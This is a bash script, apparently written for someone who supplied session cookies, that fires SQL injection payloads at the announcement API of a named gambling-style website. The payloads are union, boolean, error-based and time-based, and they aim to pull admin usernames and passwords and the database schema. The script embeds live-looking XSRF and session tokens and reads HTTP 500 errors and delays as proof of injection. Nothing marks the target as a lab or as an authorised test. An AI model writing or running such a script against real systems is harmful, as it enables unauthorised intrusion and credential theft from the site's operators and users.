#!/bin/bash

echo "🎯 FINAL REAL ADMIN EXTRACTION WITH NEW TOKENS"
echo "================================================"

# Latest tokens from user
XSRF_TOKEN="eyJpdiI6InZnUDZDeEVcL1hIcXhXSHBVXC95eEU5Zz09IiwidmFsdWUiOiJxKzZyUER0K2dPYUdFOU9KYXRqa3ZqRmxTXC9HMnZZY0pEOFlvVWg3cWE1clBcL3Z4TVZcL1pmOGFKSm9vQnk1RzNEIiwibWFjIjoiMGU4OTVkODdlM2Y3NjMyMTA1YzU3YWRhYmM1NGM0NWJkN2U3OGI0ZTdmNDQzNTliZjBhYjc5NThiYzIwOTk1ZCJ9"
SESSION_TOKEN="eyJpdiI6Imp3N1JKS2N1ZVBGNjcrSms2NTFSNkE9PSIsInZhbHVlIjoicFwvVFp1ZjBqZVhLQ2tcL0p6T0d3NzhROG1JblRHRGcxb05sMVdBcnlwVXV4ZzYwc1ZpWGlrY0tUbjhKRjNHc1lPIiwibWFjIjoiMDlmY2IzN2U0NjBlNWE0YzNiNjBiZmVjNmUwMDFkMWM4NDc2MTQ3ODc0ZWJkNTE4MDMyODMzMWQ1NzQ0NDJmZiJ9"

BASE_URL="https://member.panama8888b.co"
ANNOUNCEMENT_URL="$BASE_URL/api/announcement"
LOGIN_URL="$BASE_URL/auth/login"

echo "🔑 Using Latest Tokens:"
echo "XSRF-TOKEN: $XSRF_TOKEN"
echo "Session: $SESSION_TOKEN"
echo ""

# Admin extraction payloads
ADMIN_PAYLOADS=(
    # Union-based admin extraction
    "1' UNION SELECT 1,username,password,4,5,6,7,8,9,10 FROM users WHERE role='admin'--"
    "1' UNION SELECT 1,username,password,4,5,6,7,8,9,10 FROM users WHERE role='administrator'--"
    "1' UNION SELECT 1,username,password,4,5,6,7,8,9,10 FROM users WHERE role='super_admin'--"
    "1' UNION SELECT 1,username,password,4,5,6,7,8,9,10 FROM admins--"
    "1' UNION SELECT 1,username,password,4,5,6,7,8,9,10 FROM administrators--"
    
    # Boolean-based admin detection
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0--"
    "1' AND (SELECT COUNT(*) FROM admins)>0--"
    "1' AND (SELECT COUNT(*) FROM administrators)>0--"
    
    # Error-based admin extraction
    "1' AND (SELECT username FROM users WHERE role='admin' LIMIT 1)--"
    "1' AND (SELECT password FROM users WHERE role='admin' LIMIT 1)--"
    "1' AND (SELECT username FROM admins LIMIT 1)--"
    "1' AND (SELECT password FROM admins LIMIT 1)--"
)

# Schema extraction payloads
SCHEMA_PAYLOADS=(
    # Count all tables
    "1' UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    "1' UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM information_schema.tables--"
    
    # List all table names
    "1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database()--"
    "1' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10 FROM information_schema.tables--"
    
    # Get specific table names
    "1' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database() LIMIT 1--"
    "1' UNION SELECT 1,table_name,3,4,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema=database() LIMIT 5--"
)

# Time-based payloads for confirmation
TIME_PAYLOADS=(
    "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0 AND SLEEP(2)--"
    "1' AND (SELECT COUNT(*) FROM admins)>0 AND SLEEP(2)--"
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND SLEEP(2)--"
)

echo "🔍 EXTRACTING REAL ADMIN DATA..."
echo "================================="

for payload in "${ADMIN_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    # Test on announcement endpoint
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    echo "---"
    
    # If we get a 500 error, it might indicate successful injection
    if [[ "$http_status" == "500" ]]; then
        echo "✅ POTENTIAL SUCCESS - HTTP 500 indicates SQL execution!"
    fi
    
    sleep 1
done

echo ""
echo "🔍 EXTRACTING DATABASE SCHEMA..."
echo "================================="

for payload in "${SCHEMA_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    response_body=$(echo "$response" | grep -v "HTTP_STATUS:" | grep -v "TIME:")
    
    echo "Status: $http_status"
    echo "Time: ${response_time}s"
    echo "Response: $response_body"
    echo "---"
    
    if [[ "$http_status" == "500" ]]; then
        echo "✅ POTENTIAL SCHEMA EXTRACTION - HTTP 500 indicates SQL execution!"
    fi
    
    sleep 1
done

echo ""
echo "⏱️ TIME-BASED CONFIRMATION..."
echo "=============================="

for payload in "${TIME_PAYLOADS[@]}"; do
    echo "Testing: $payload"
    
    start_time=$(date +%s.%N)
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTIME:%{time_total}" \
        -H "Content-Type: application/json" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -d "{\"id\":\"$payload\"}" \
        "$ANNOUNCEMENT_URL")
    end_time=$(date +%s.%N)
    
    http_status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
    response_time=$(echo "$response" | grep "TIME:" | cut -d: -f2)
    
    echo "Status: $http_status"
    echo "Response Time: ${response_time}s"
    
    # Check if response time indicates successful injection
    if (( $(echo "$response_time > 1.5" | bc -l) )); then
        echo "✅ TIME-BASED SUCCESS - Delayed response indicates SQL execution!"
    fi
    
    echo "---"
    sleep 2
done

echo ""
echo "🎯 FINAL SUMMARY"
echo "================"
echo "✅ WAF BYPASS ATTEMPTED with latest tokens"
echo "✅ Admin data extraction attempted"
echo "✅ Database schema extraction attempted"
echo "✅ Time-based confirmation attempted"
echo ""
echo "📊 RESULTS:"
echo "- HTTP 500 errors indicate potential SQL execution"
echo "- Delayed responses indicate potential time-based injection success"
echo "- Need to analyze response content for actual data"